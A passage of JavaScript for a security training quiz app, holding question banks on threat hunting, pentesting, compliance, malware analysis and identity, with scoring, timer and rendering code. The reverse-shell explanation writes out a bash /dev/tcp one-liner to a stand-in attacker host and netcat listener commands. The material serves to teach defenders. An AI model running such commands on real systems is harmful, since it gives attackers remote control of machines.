      { q: 'What is threat hunting?', opts: ['Actively searching for threats that have evaded existing security controls', 'Installing and configuring threat detection tools', 'Responding to security alerts', 'Penetration testing the network'], correct: 0, difficulty: 'intermediate', explain: 'Threat hunting is the proactive, hypothesis-driven search for threats that have evaded automated detection systems. Hunters form hypotheses based on threat intelligence, environmental knowledge, and experience, then search for evidence of compromise using tools like SIEM queries, EDR data, network traffic analysis, and endpoint forensics. Unlike incident response (reactive), hunting assumes the attacker is already inside and seeks to find them. Reference: MITRE ATT&CK for Hunting.' },
      { q: 'What Windows Event ID indicates a successful logon?', opts: ['4624', '4625', '4634', '4648'], correct: 0, difficulty: 'beginner', explain: 'Event ID 4624 records successful account logon events in the Windows Security log. Key fields: Logon Type (2=Interactive, 3=Network, 7=Unlock, 10=RemoteInteractive/RDP), account name, source network address, and logon process. Event 4625 = failed logon, 4634 = logoff, 4648 = logon using explicit credentials (RunAs). For incident response, correlate 4624 with logon type and source IP to identify unauthorized access. Reference: Microsoft Security Auditing.' },
      { q: 'What is the purpose of a forensic disk image?', opts: ['A backup of important files', 'A bit-for-bit copy of the entire storage device, including deleted files and slack space', 'A compressed archive of the filesystem', 'A snapshot of the operating system configuration'], correct: 1, difficulty: 'intermediate', explain: 'A forensic disk image is a bit-for-bit (sector-level) copy of the entire storage device, capturing everything: allocated files, deleted files, file slack, unallocated space, MBR/GPT, and hidden partitions. Unlike a file backup, it preserves the exact state of the disk for analysis. Tools: dd, dc3dd, FTK Imager, EnCase. Always use a write blocker when imaging to prevent accidental modification. Verify integrity with hash comparison (source vs. image). Reference: NIST SP 800-86.' },
      { q: 'What is an Indicator of Compromise (IOC)?', opts: ['A vulnerability in the system', 'An artifact observed on a network or system that indicates a potential security breach', 'A compliance violation', 'A risk assessment metric'], correct: 1, difficulty: 'beginner', explain: 'IOCs are forensic artifacts that indicate a potential security breach has occurred. Examples: malicious IP addresses, domain names, file hashes (MD5/SHA256), registry key modifications, unusual process names, anomalous DNS queries, known malware signatures. IOCs are shared in standardized formats: STIX/TAXII, OpenIOC, YARA rules. They enable organizations to search their environments for evidence of known attacks. IOCs are reactive — they describe known threats, not zero-days. Reference: STIX/TAXII, OpenIOC.' },
      { q: 'What tool is used for Windows memory forensics?', opts: ['Autopsy', 'Volatility', 'Wireshark', 'FTK Imager'], correct: 1, difficulty: 'intermediate', explain: 'Volatility (now Volatility 3) is the leading open-source memory forensics framework. It analyzes RAM dumps to extract: running processes (pslist, pstree), network connections (netscan), loaded DLLs (dlllist), registry hives (hivelist), command history (cmdscan), injected code (malfind), and more. Memory analysis can reveal malware that exists only in RAM (fileless), encryption keys, and evidence that disk forensics might miss. Memory must be captured before system shutdown. Reference: Volatility Foundation.' },
      { q: 'What is the difference between containment and eradication in incident response?', opts: ['They are the same thing', 'Containment stops the spread; eradication removes the threat entirely', 'Containment is temporary; eradication is permanent network isolation', 'Containment is for malware; eradication is for unauthorized access'], correct: 1, difficulty: 'intermediate', explain: 'Containment limits the damage and prevents further spread (e.g., isolating compromised hosts, blocking C2 IPs, disabling compromised accounts) — it\'s about stopping the bleeding. Eradication removes the threat root cause (e.g., removing malware, closing vulnerabilities, eliminating persistence mechanisms, resetting compromised credentials). Containment must happen first to prevent the attacker from expanding while you work on eradication. Both must be thorough — incomplete eradication leads to reinfection. Reference: NIST SP 800-61.' },
    ],
  },
  {
    id: 'pr-pentest', name: 'Penetration Testing', color: '#f87171',
    questions: [
      { q: 'What is the difference between black box, white box, and gray box penetration testing?', opts: ['They refer to the color of the testing equipment', 'Black box = no info, white box = full info, gray box = partial info about the target', 'They refer to different compliance requirements', 'Black box = external, white box = internal, gray box = both'], correct: 1, difficulty: 'beginner', explain: 'Black box: tester has no prior knowledge of the target (simulates external attacker). White box: tester has full knowledge — source code, architecture, credentials, network diagrams (simulates insider or comprehensive audit). Gray box: tester has partial knowledge — maybe credentials but no source code, or network ranges but no architecture details. Gray box is often the most realistic and efficient approach for corporate penetration tests. Reference: PTES, OWASP Testing Guide.' },
      { q: 'What is the purpose of a Rules of Engagement (ROE) document in penetration testing?', opts: ['Define the scoring system for findings', 'Define the scope, boundaries, authorized techniques, emergency contacts, and legal protections for the test', 'List the tools the tester must use', 'Document the tester\'s qualifications'], correct: 1, difficulty: 'beginner', explain: 'The ROE is a legally binding document that defines: scope (in-scope/out-of-scope targets), testing window, authorized techniques, prohibited actions, emergency contacts, communication protocols, data handling requirements, legal authorization, and liability protections. It protects both the tester and the client. Without a proper ROE, penetration testing could be considered unauthorized access (a criminal offense under CFAA and similar laws). Reference: PTES Pre-engagement.' },
      { q: 'What is pivoting in penetration testing?', opts: ['Rotating between different testing tools', 'Using a compromised system as a launchpad to attack other systems on the internal network', 'Changing the testing methodology mid-engagement', 'Switching between black box and white box approaches'], correct: 1, difficulty: 'intermediate', explain: 'Pivoting uses a compromised system to access and attack other systems that are not directly reachable from the attacker\'s position. For example, after compromising a web server in the DMZ, the attacker sets up a tunnel through it to reach internal network segments. Tools: SSH tunneling, Chisel, proxychains, Metasploit autoroute, Cobalt Strike SOCKS proxy. Pivoting demonstrates the true impact of a single compromised host. Reference: OSCP Methodology.' },
      { q: 'What is the CVSS score range for a \'Critical\' severity vulnerability?', opts: ['7.0 - 8.9', '9.0 - 10.0', '8.0 - 9.9', '10.0 only'], correct: 1, difficulty: 'beginner', explain: 'CVSS v3.1 severity ratings: None (0.0), Low (0.1-3.9), Medium (4.0-6.9), High (7.0-8.9), Critical (9.0-10.0). The base score is calculated from Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, and Confidentiality/Integrity/Availability impact. A score of 9.0+ typically indicates a remotely exploitable vulnerability requiring no authentication with high impact (e.g., unauthenticated RCE). Reference: FIRST CVSS v3.1.' },
      { q: 'What is a reverse shell?', opts: ['A shell that reverses the direction of commands', 'A shell where the target initiates a connection back to the attacker, providing command execution', 'A shell that decrypts encrypted communications', 'A shell running on a reverse proxy'], correct: 1, difficulty: 'beginner', explain: 'A reverse shell is when the compromised target initiates an outbound connection to the attacker\'s listening machine, providing the attacker with an interactive command shell. This bypasses firewall rules that typically block inbound connections but allow outbound. The attacker sets up a listener (nc -lvnp 4444), and the target connects back. Common payloads: bash -i >& /dev/tcp/attacker/4444 0>&1, python, PHP, PowerShell reverse shells. Reference: PayloadsAllTheThings.' },
      { q: 'What is password spraying?', opts: ['Trying many passwords against one account rapidly', 'Trying one or a few common passwords against many accounts simultaneously', 'Spraying hashed passwords across a network', 'A type of rainbow table attack'], correct: 1, difficulty: 'beginner', explain: 'Password spraying tries a small number of commonly used passwords (e.g., \'Summer2024!\', \'Welcome1\', \'Password123\') against a large number of accounts. Unlike brute force (many passwords vs. one account, which triggers lockouts), spraying tries one password per account per lockout period, staying under the threshold. It\'s highly effective because there\'s almost always at least one account with a weak password. Defense: ban common passwords, MFA, smart lockout. Reference: MITRE T1110.003.' },
      { q: 'What is the purpose of enumeration in penetration testing?', opts: ['Counting the number of vulnerabilities found', 'Actively extracting information about users, shares, services, and configurations from target systems', 'Listing all tools used during the test', 'Creating a numbered list of findings'], correct: 1, difficulty: 'beginner', explain: 'Enumeration is the phase where testers actively extract detailed information from target systems: usernames, group memberships, network shares, services and versions, email addresses, SNMP data, DNS records, and application details. Unlike passive reconnaissance, enumeration involves direct interaction with target systems. It bridges the gap between reconnaissance and exploitation by identifying specific attack vectors. Tools: enum4linux, smbclient, rpcclient, ldapsearch, nmap scripts. Reference: PTES Information Gathering.' },
      { q: 'What is a bind shell vs. a reverse shell?', opts: ['Bind shell uses TCP, reverse shell uses UDP', 'Bind shell listens on the target; reverse shell connects from the target to the attacker', 'Bind shell is encrypted; reverse shell is plaintext', 'Bind shell is for Linux; reverse shell is for Windows'], correct: 1, difficulty: 'intermediate', explain: 'Bind shell: the payload opens a listening port on the target, and the attacker connects to it (nc target 4444). Reverse shell: the target connects outbound to the attacker\'s listener (nc -lvnp 4444). Reverse shells are preferred because: 1) They bypass inbound firewall rules. 2) They traverse NAT (target initiates the connection). 3) They\'re harder to detect (outbound connections are common). Bind shells are only useful when the target has no firewall filtering inbound connections. Reference: OSCP PWK.' },
      { q: 'What is the significance of the /etc/shadow file in Linux?', opts: ['It contains system configuration', 'It stores hashed passwords for user accounts with restricted access (root only)', 'It defines shadow network routes', 'It contains encrypted log files'], correct: 1, difficulty: 'intermediate', explain: '/etc/shadow stores password hashes for all user accounts, separated from /etc/passwd (which is world-readable). Fields: username, hashed password (algorithm$salt$hash), last change date, min/max age, warning period, inactive period, expiration date. The hash format indicates the algorithm: $1$ = MD5, $5$ = SHA-256, $6$ = SHA-512, $2y$ = bcrypt, $y$ = yescrypt. Only root can read this file. In pentesting, obtaining /etc/shadow allows offline password cracking. Reference: Linux man pages shadow(5).' },
      { q: 'What is the purpose of a post-exploitation framework?', opts: ['Generate vulnerability reports', 'Maintain access, gather intelligence, pivot, and demonstrate business impact after initial compromise', 'Fix vulnerabilities after testing', 'Monitor the network for new vulnerabilities'], correct: 1, difficulty: 'intermediate', explain: 'Post-exploitation frameworks provide tools for actions after gaining initial access: persistence (survive reboots), privilege escalation, credential harvesting, lateral movement, data collection, and exfiltration. They help demonstrate real-world business impact beyond just \'we got in\'. Frameworks: Metasploit Meterpreter, Cobalt Strike Beacon, Sliver, Empire, Covenant. Post-exploitation is often where the most critical findings are discovered — showing what an attacker could actually do with access. Reference: PTES Post-Exploitation.' },
    ],
  },
  {
    id: 'pr-grc', name: 'Compliance/GRC', color: '#34d399',
    questions: [
      { q: 'What does PCI DSS stand for and who must comply?', opts: ['Payment Card Industry Data Security Standard — any organization that stores, processes, or transmits cardholder data', 'Private Cloud Infrastructure DSS — cloud service providers only', 'Personal Computer Internet DSS — all internet-connected businesses', 'Public Communication Industry DSS — telecommunications companies'], correct: 0, difficulty: 'beginner', explain: 'PCI DSS (Payment Card Industry Data Security Standard) applies to any organization that stores, processes, or transmits credit card data, regardless of size. It has 12 requirements covering: firewalls, encryption, access control, monitoring, vulnerability management, and security policies. Non-compliance can result in fines ($5,000-$100,000/month), increased transaction fees, or loss of ability to process card payments. Compliance levels (1-4) are based on transaction volume. Reference: PCI SSC.' },
      { q: 'What is the purpose of a risk assessment?', opts: ['Identify and install security tools', 'Identify, analyze, and evaluate security risks to prioritize mitigation efforts', 'Test the network for vulnerabilities', 'Train employees on security policies'], correct: 1, difficulty: 'beginner', explain: 'Risk assessment systematically identifies assets, threats, vulnerabilities, and the likelihood and impact of security incidents. It enables informed decision-making about where to allocate security resources. Steps: 1) Identify assets and their value. 2) Identify threats and vulnerabilities. 3) Analyze likelihood and impact. 4) Calculate risk (Risk = Likelihood × Impact). 5) Prioritize and recommend treatments (mitigate, accept, transfer, avoid). Frameworks: NIST SP 800-30, ISO 27005, FAIR. Reference: NIST SP 800-30.' },
      { q: 'What is the difference between a vulnerability assessment and a penetration test?', opts: ['They are the same thing with different names', 'VA identifies vulnerabilities; pentest attempts to exploit them to demonstrate real impact', 'VA is automated; pentest is manual', 'VA is for compliance; pentest is optional'], correct: 1, difficulty: 'beginner', explain: 'Vulnerability assessment identifies and classifies vulnerabilities using automated scanners (Nessus, Qualys, Rapid7) — it provides breadth of coverage but doesn\'t verify exploitability or demonstrate impact. Penetration testing goes further: testers actively exploit vulnerabilities, chain them together, escalate privileges, and demonstrate what an attacker could actually achieve. VA answers \'what could go wrong?\'; pentest answers \'what WILL happen when things go wrong?\'. Organizations need both. Reference: NIST SP 800-115.' },
      { q: 'What is SOC 2 compliance?', opts: ['Security Operations Center Level 2 certification', 'An audit framework for service organizations based on Trust Service Criteria: Security, Availability, Processing Integrity, Confidentiality, Privacy', 'A military security clearance level', 'A Sarbanes-Oxley sub-requirement'], correct: 1, difficulty: 'intermediate', explain: 'SOC 2 (System and Organization Controls 2) is an audit framework by AICPA for service organizations. It evaluates controls based on five Trust Service Criteria: Security (mandatory), Availability, Processing Integrity, Confidentiality, and Privacy (optional based on service). Type I reports assess control design at a point in time. Type II reports assess design AND operating effectiveness over a period (typically 6-12 months). SOC 2 reports are increasingly required by enterprise customers evaluating SaaS vendors. Reference: AICPA SOC 2.' },
      { q: 'Under GDPR, what is a Data Protection Impact Assessment (DPIA)?', opts: ['A technical vulnerability scan of data storage systems', 'A systematic assessment of data processing operations to identify and minimize data protection risks', 'An annual financial audit of data protection costs', 'A background check on data protection officers'], correct: 1, difficulty: 'advanced', explain: 'A DPIA (Article 35, GDPR) is required when data processing is likely to result in high risk to individuals\' rights and freedoms. It must: describe the processing, assess necessity and proportionality, evaluate risks to data subjects, and identify measures to mitigate those risks. Required for: systematic monitoring, large-scale processing of sensitive data, automated decision-making. The DPO must be consulted. If risks can\'t be mitigated, the supervisory authority must be consulted before processing begins. Reference: GDPR Article 35.' },
    ],
  },
  {
    id: 'pr-malware', name: 'Malware Analysis', color: '#facc15',
    questions: [
      { q: 'What is the difference between static and dynamic malware analysis?', opts: ['Static analyzes the malware\'s network traffic; dynamic analyzes its code', 'Static examines code without execution; dynamic observes behavior during execution', 'Static uses antivirus; dynamic uses sandbox', 'Static is for known malware; dynamic is for unknown'], correct: 1, difficulty: 'beginner', explain: 'Static analysis examines malware without executing it: disassembly (IDA Pro, Ghidra), string extraction, import/export analysis, PE header inspection, YARA matching, and code review. Dynamic analysis executes the malware in a controlled environment (sandbox) and observes its behavior: file system changes, registry modifications, network connections, process creation, API calls. Both are complementary — static reveals what the malware CAN do; dynamic reveals what it DOES do in practice. Reference: Practical Malware Analysis, Sikorski.' },
      { q: 'What is a sandbox in malware analysis?', opts: ['A tool for building malware', 'An isolated environment where malware can be safely executed and its behavior observed', 'A type of firewall that blocks malware', 'A backup system for infected files'], correct: 1, difficulty: 'beginner', explain: 'A malware sandbox is an isolated virtual environment designed to safely execute and observe malicious software. It monitors: file system activity, registry changes, network communications, process behavior, API calls, and system changes. Modern sandboxes: Cuckoo Sandbox (open-source), ANY.RUN (interactive), Joe Sandbox, VirusTotal, Hybrid Analysis. Challenges: malware may detect sandboxes and alter behavior (anti-sandbox evasion), time-delayed execution, and environment-specific triggers. Reference: Cuckoo Sandbox Documentation.' },
      { q: 'What does the YARA tool do?', opts: ['Scan networks for malware', 'Create pattern-matching rules to identify and classify malware samples', 'Decrypt malware communications', 'Remove malware from infected systems'], correct: 1, difficulty: 'intermediate', explain: 'YARA is a tool for creating rules that identify and classify malware based on textual or binary patterns. Rules can match: specific strings, hex sequences, regular expressions, file sizes, entry points, and complex conditions. YARA rules are widely used in: malware research, incident response (scanning endpoints), threat hunting, antivirus engines, and automated malware classification. Example: rule APT28_Backdoor { strings: $s1 = "sofacy" condition: any of them }. Reference: YARA Documentation.' },
      { q: 'What is a packer in the context of malware?', opts: ['A tool for packaging malware for distribution', 'A program that compresses and/or encrypts an executable to evade detection and hinder analysis', 'A network tool for packet crafting', 'A type of rootkit'], correct: 1, difficulty: 'intermediate', explain: 'Packers compress, encrypt, or obfuscate executable files to: reduce file size, evade signature-based antivirus detection, and hinder reverse engineering. The packed executable contains a stub that unpacks the original code into memory at runtime. Common packers: UPX (legitimate), Themida, VMProtect, ASPack, PECompact. Malware analysts must unpack before analysis. Detection: abnormal section names, high entropy, small import table, stub-like entry point. Tools: Detect It Easy, PEiD, unpacking plugins. Reference: Practical Malware Analysis.' },
      { q: 'What are the common stages of a malware lifecycle?', opts: ['Download, Install, Run, Delete', 'Delivery, Exploitation, Installation, C2, Actions on Objectives (similar to Cyber Kill Chain)', 'Compile, Test, Deploy, Monitor', 'Encrypt, Spread, Collect, Decrypt'], correct: 1, difficulty: 'beginner', explain: 'The malware lifecycle closely follows the Cyber Kill Chain: 1) Delivery — malware reaches the target (phishing, drive-by, USB). 2) Exploitation — vulnerability exploited to execute code. 3) Installation — malware installs persistence mechanisms. 4) Command & Control — establishes communication with attacker. 5) Actions on Objectives — data theft, ransomware, lateral movement, espionage. Understanding the lifecycle helps defenders identify and disrupt attacks at each stage. Reference: Lockheed Martin Cyber Kill Chain.' },
    ],
  },
  {
    id: 'pr-iam', name: 'Identity & Access Management', color: '#2dd4bf',
    questions: [
      { q: 'What is Multi-Factor Authentication (MFA)?', opts: ['Using multiple passwords for one account', 'Requiring two or more independent authentication factors from different categories', 'Having multiple accounts for redundancy', 'Using a password manager'], correct: 1, difficulty: 'beginner', explain: 'MFA requires authentication using two or more factors from different categories: 1) Something you know (password, PIN). 2) Something you have (phone, hardware token, smart card). 3) Something you are (fingerprint, face, iris). Using two passwords is NOT MFA (both are \'something you know\'). MFA dramatically reduces account compromise — even if a password is stolen, the attacker needs the second factor. Strongest: FIDO2/WebAuthn hardware keys (phishing-resistant). Reference: NIST SP 800-63B.' },
      { q: 'What is the difference between authentication and authorization?', opts: ['They are the same thing', 'Authentication verifies identity (who you are); authorization determines access (what you can do)', 'Authentication is for users; authorization is for systems', 'Authentication uses passwords; authorization uses tokens'], correct: 1, difficulty: 'beginner', explain: 'Authentication verifies identity — confirming you are who you claim to be (via password, biometrics, certificate, etc.). Authorization determines what an authenticated user is permitted to do — which resources they can access and what actions they can perform. Example: logging into Gmail is authentication; being allowed to read only your own emails is authorization. They are separate concerns: strong authentication without proper authorization still allows unauthorized access. Reference: OWASP Authentication.' },
      { q: 'What is RBAC (Role-Based Access Control)?', opts: ['Restricting access based on time of day', 'Assigning permissions to roles, then assigning users to roles', 'Controlling access based on IP addresses', 'Using biometric data for access decisions'], correct: 1, difficulty: 'beginner', explain: 'RBAC assigns permissions to defined roles (e.g., admin, editor, viewer, auditor), then assigns users to roles. This simplifies permission management — instead of assigning individual permissions to each user, you manage role assignments. When an employee changes position, you change their role, not individual permissions. RBAC principles: least privilege (roles have minimum necessary permissions), separation of duties (no single role has conflicting permissions), and role hierarchy. Reference: NIST RBAC Model.' },
      { q: 'What is a Golden Ticket attack?', opts: ['Stealing a user\'s session cookie', 'Forging a Kerberos TGT using the krbtgt account hash, granting unlimited domain access', 'Creating a fake SSL certificate', 'Bypassing MFA using a hardware token'], correct: 1, difficulty: 'advanced', explain: 'A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the krbtgt account\'s NTLM hash (obtained via DCSync or NTDS.dit extraction). With a Golden Ticket, the attacker can impersonate any user, access any resource, for any duration — effectively having persistent, undetectable domain admin access. The only remediation is resetting the krbtgt password TWICE (because AD keeps the current and previous password). Golden Tickets survive individual password resets. Reference: MITRE T1558.001.' },
      { q: 'What is Zero Trust security?', opts: ['Trusting no one and blocking all network traffic', 'A security model that requires continuous verification — never trust, always verify — regardless of network location', 'A firewall configuration with zero open ports', 'A policy of zero tolerance for security violations'], correct: 1, difficulty: 'intermediate', explain: 'Zero Trust eliminates the concept of a trusted internal network. Every access request is fully verified regardless of source: identity verification (strong MFA), device health check, least-privilege access, micro-segmentation, and continuous monitoring. Principles: 1) Verify explicitly (authenticate and authorize every request). 2) Use least-privilege access. 3) Assume breach (minimize blast radius, segment access, verify end-to-end encryption, use analytics for detection). Core components: identity, device, network, application, data protection. Reference: NIST SP 800-207.' },
    ],
  },
];

var DIFFICULTY_COLORS = {
  beginner: '#22c55e',
  intermediate: '#f59e0b',
  advanced: '#ef4444'
};

var DIFFICULTY_LABELS = {
  beginner: 'Beginner',
  intermediate: 'Intermediate',
  advanced: 'Advanced'
};

function getScores() {
  try { return JSON.parse(localStorage.getItem('sa_scores') || '{}'); } catch (e) { return {}; }
}
function saveScores(s) {
  try { localStorage.setItem('sa_scores', JSON.stringify(s)); } catch (e) {}
}
function shuffled(arr) {
  var a = arr.slice();
  for (var i = a.length - 1; i > 0; i--) { var j = Math.floor(Math.random() * (i + 1)); var t = a[i]; a[i] = a[j]; a[j] = t; }
  return a;
}
var EXAM_MS = 30 * 60 * 1000;
function formatTime(ms) {
  var secs = Math.floor(ms / 1000);
  var mins = Math.floor(secs / 60);
  secs = secs % 60;
  if (mins > 0) return mins + 'm ' + secs + 's';
  return secs + 's';
}

export function renderSecurityQuiz(main) {
  var activeModule = null;
  var currentQ = 0;
  var answers = [];
  var scores = getScores();
  var showResult = false;
  var selectedDifficulty = 'all';
  var filteredQuestions = [];
  var showDifficultyPicker = false;
  var quizStartTime = 0;
  var questionStartTime = 0;
  var questionTimes = [];
  var reviewMistakesOnly = false;
  var timerInterval = null;
  var examDeadline = 0;
  var timedOut = false;

  function timerText() {
    if (!examDeadline) return formatTime(Date.now() - quizStartTime);
    var left = Math.max(0, examDeadline - Date.now()), sec = Math.ceil(left / 1000);
    return Math.floor(sec / 60) + ':' + String(sec % 60).padStart(2, '0') + ' left';
  }

  function startTimer() {
    stopTimer();
    timerInterval = setInterval(function() {
      var el = main.querySelector('#sa-timer');
      // The quiz view is gone (another tool opened, or the user went back): stop quietly.
      if (!el) { stopTimer(); return; }
      el.textContent = timerText();
      if (examDeadline && Date.now() >= examDeadline) { timedOut = true; finishQuiz(); }
    }, 1000);
  }

  // Record the attempt and show results. Unanswered questions (a timed exam that ran out)
  // count against the score because the total is the full question set.
  function finishQuiz() {
    var mod = activeModule;
    stopTimer();
    showResult = true;
    var score = answers.filter(function(a) { return a.correct; }).length;
    var totalTime = Date.now() - quizStartTime;
    var attempt = { score: score, total: filteredQuestions.length, date: new Date().toISOString(), difficulty: selectedDifficulty, time: totalTime };
    // Keep the best result: higher percentage wins; on a tie, the faster
    // run wins. A worse retake must not downgrade a passing module, and
    // "Best time" must reflect the fastest run at the best score.
    var prev = scores[mod.id];
    var newPct = score / filteredQuestions.length;
    var prevPct = prev ? prev.score / prev.total : -1;
    if (!prev || newPct > prevPct || (newPct === prevPct && totalTime < prev.time)) {
      scores[mod.id] = attempt;
      saveScores(scores);
    }
    render();
  }

  // Practitioner mixes: a random draw across every domain, optionally as a 30-minute exam.
  function startMix(exam) {
    var n = exam ? 30 : 20, pool = [];
    PRACTITIONER.forEach(function(m) { m.questions.forEach(function(q) { pool.push(Object.assign({ cat: m.name }, q)); }); });
    activeModule = { id: exam ? 'pr-exam' : 'pr-mix', name: exam ? 'Practitioner Exam' : 'Practitioner Random Mix', color: '#38bdf8', exam: exam, questions: shuffled(pool).slice(0, n) };
    filteredQuestions = activeModule.questions;
    selectedDifficulty = 'all';
    showDifficultyPicker = false;
    currentQ = 0; answers = []; questionTimes = [];
    showResult = false; reviewMistakesOnly = false; timedOut = false;
    quizStartTime = Date.now(); questionStartTime = Date.now();
    examDeadline = exam ? quizStartTime + EXAM_MS : 0;
    startTimer();
    render();
  }

  function stopTimer() {
    if (timerInterval) {
      clearInterval(timerInterval);
      timerInterval = null;
    }
  }

  function getFilteredQuestions(mod, diff) {
    if (diff === 'all') return mod.questions.slice();
    return mod.questions.filter(function(q) { return q.difficulty === diff; });
  }

  function render() {
    if (showDifficultyPicker && activeModule) { renderDifficultyPicker(); return; }
    if (activeModule && !showResult) { renderQuiz(); return; }
    if (showResult) { renderResults(); return; }

    stopTimer();

    var html = '<h1 class="pg-h1">Security Awareness Training</h1>' +
      '<p class="muted pg-sub">' + MODULES.length + ' training modules with scenario-based quizzes across 3 difficulty levels. Complete all modules to earn your security awareness certificate.</p>';

    var totalQuestions = 0;
    MODULES.forEach(function(m) { totalQuestions += m.questions.length; });
    html += '<div style="display:flex;gap:10px;flex-wrap:wrap;margin:12px 0">' +
      '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:8px 14px;font-size:.78rem"><span style="color:var(--acc);font-weight:700">' + totalQuestions + '</span> <span class="muted">Total Questions</span></div>' +
      '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:8px 14px;font-size:.78rem"><span style="color:#22c55e;font-weight:700">Beginner</span> <span class="muted">+ </span><span style="color:#f59e0b;font-weight:700">Intermediate</span> <span class="muted">+ </span><span style="color:#ef4444;font-weight:700">Advanced</span></div>' +
      '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:8px 14px;font-size:.78rem"><span class="muted">Pass threshold: </span><span style="color:var(--acc);font-weight:700">80%</span></div>' +
    '</div>';

    var totalComplete = 0;
    html += '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px;margin-top:16px">';
    MODULES.forEach(function(mod) {
      var best = scores[mod.id];
      var pct = best ? Math.round(best.score / best.total * 100) : 0;
      var passed = pct >= 80;
      if (passed) totalComplete++;

      var diffCounts = { beginner: 0, intermediate: 0, advanced: 0 };
      mod.questions.forEach(function(q) { diffCounts[q.difficulty]++; });

      html += '<div style="background:var(--card);border:1px solid var(--line);border-left:3px solid ' + mod.color + ';border-radius:6px;padding:16px;cursor:pointer" class="sa-mod" data-mod="' + mod.id + '">' +
        '<div style="display:flex;align-items:center;gap:10px">' +
          '<div style="font-weight:600;font-size:.9rem;flex:1">' + esc(mod.name) + '</div>' +
          (best ? '<span style="font-size:.72rem;padding:3px 8px;border-radius:3px;background:' + (passed ? '#00e67622' : '#ff174422') + ';color:' + (passed ? '#00e676' : '#ff1744') + '">' + pct + '%' + (passed ? ' PASS' : ' FAIL') + '</span>' : '') +
        '</div>' +
        '<div class="muted" style="font-size:.75rem;margin-top:6px">' + mod.questions.length + ' questions</div>' +
        '<div style="display:flex;gap:4px;margin-top:6px">' +
          '<span style="font-size:.62rem;padding:1px 6px;border-radius:3px;background:#22c55e22;color:#22c55e">' + diffCounts.beginner + ' beginner</span>' +
          '<span style="font-size:.62rem;padding:1px 6px;border-radius:3px;background:#f59e0b22;color:#f59e0b">' + diffCounts.intermediate + ' intermediate</span>' +
          '<span style="font-size:.62rem;padding:1px 6px;border-radius:3px;background:#ef444422;color:#ef4444">' + diffCounts.advanced + ' advanced</span>' +
        '</div>' +
        (best ? '<div style="background:var(--line);height:4px;border-radius:2px;margin-top:8px;overflow:hidden"><div style="height:100%;width:' + pct + '%;background:' + (passed ? '#00e676' : '#ff1744') + ';border-radius:2px"></div></div>' : '') +
        (best && best.time ? '<div class="muted" style="font-size:.65rem;margin-top:4px">Best time: ' + formatTime(best.time) + '</div>' : '') +
      '</div>';
    });
    html += '</div>';

    var prTotal = 0;
    PRACTITIONER.forEach(function(m) { prTotal += m.questions.length; });
    html += '<h2 style="margin:24px 0 4px;font-size:1.05rem">Practitioner Track</h2>' +
      '<p class="muted" style="margin:0 0 10px;font-size:.8rem">' + prTotal + ' technical questions for security staff across ' + PRACTITIONER.length + ' domains. Not part of the awareness certificate.</p>' +
      '<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">' +
        '<button class="btn" id="sa-pr-mix">Random Mix (20 questions)</button>' +
        '<button class="btn ghost" id="sa-pr-exam">Timed Exam (30 questions, 30 min)</button>' +
      '</div>' +
      '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:8px">';
    PRACTITIONER.forEach(function(mod) {
      var best = scores[mod.id];
      var pct = best ? Math.round(best.score / best.total * 100) : 0;
      html += '<div style="background:var(--card);border:1px solid var(--line);border-left:3px solid ' + mod.color + ';border-radius:6px;padding:12px;cursor:pointer" class="sa-mod" data-mod="' + mod.id + '">' +
        '<div style="display:flex;align-items:center;gap:8px"><div style="font-weight:600;font-size:.85rem;flex:1">' + esc(mod.name) + '</div>' +
        (best ? '<span style="font-size:.7rem;color:' + (pct >= 80 ? '#00e676' : '#ff1744') + '">' + pct + '%</span>' : '') + '</div>' +
        '<div class="muted" style="font-size:.72rem;margin-top:4px">' + mod.questions.length + ' questions</div>' +
      '</div>';
    });
    ['pr-mix', 'pr-exam'].forEach(function(id) {
      var b = scores[id];
      if (b) html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:12px;font-size:.78rem"><div style="font-weight:600">' + (id === 'pr-exam' ? 'Best exam' : 'Best random mix') + '</div><div class="muted" style="margin-top:4px">' + b.score + '/' + b.total + ' (' + Math.round(b.score / b.total * 100) + '%) in ' + formatTime(b.time) + '</div></div>';
    });
    html += '</div>';

    if (totalComplete === MODULES.length) {
      html += '<div style="background:var(--card);border:2px solid var(--acc);border-radius:6px;padding:24px;margin-top:20px;text-align:center">' +
        '<div style="font-size:1.4rem;font-weight:800;color:var(--acc);margin-bottom:8px">All Modules Complete</div>' +
        '<div class="muted" style="margin-bottom:16px">You have passed all security awareness training modules.</div>' +
        '<button class="btn" id="sa-cert">Generate Certificate</button>' +
      '</div>';
    }

    var overallPct = 0;
    var counted = 0;
    MODULES.forEach(function(m) { if (scores[m.id]) { overallPct += Math.round(scores[m.id].score / scores[m.id].total * 100); counted++; } });
    if (counted > 0) {
      html += '<div style="display:flex;gap:10px;margin-top:16px;flex-wrap:wrap">' +
        '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:12px 20px">' +
          '<div style="font-size:1.5rem;font-weight:800;color:var(--acc)">' + Math.round(overallPct / counted) + '%</div>' +
          '<div style="font-size:.72rem;color:var(--mut)">Average Score</div></div>' +
        '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:12px 20px">' +
          '<div style="font-size:1.5rem;font-weight:800;color:#00e676">' + totalComplete + '/' + MODULES.length + '</div>' +
          '<div style="font-size:.72rem;color:var(--mut)">Modules Passed</div></div>' +
        '<button class="btn sm" id="sa-reset" style="align-self:center">Reset All Scores</button>' +
      '</div>';
    }

    main.innerHTML = html;

    main.querySelectorAll('.sa-mod').forEach(function(el) {
      el.onclick = function() {
        activeModule = MODULES.concat(PRACTITIONER).find(function(m) { return m.id === el.dataset.mod; });
        examDeadline = 0;
        showDifficultyPicker = true;
        selectedDifficulty = 'all';
        render();
      };
    });

    main.querySelector('#sa-pr-mix').onclick = function() { startMix(false); };
    main.querySelector('#sa-pr-exam').onclick = function() { startMix(true); };

    var certBtn = main.querySelector('#sa-cert');
    if (certBtn) certBtn.onclick = function() { showCertificate(); };

    var resetBtn = main.querySelector('#sa-reset');
    if (resetBtn) resetBtn.onclick = function() { scores = {}; saveScores(scores); render(); };
  }

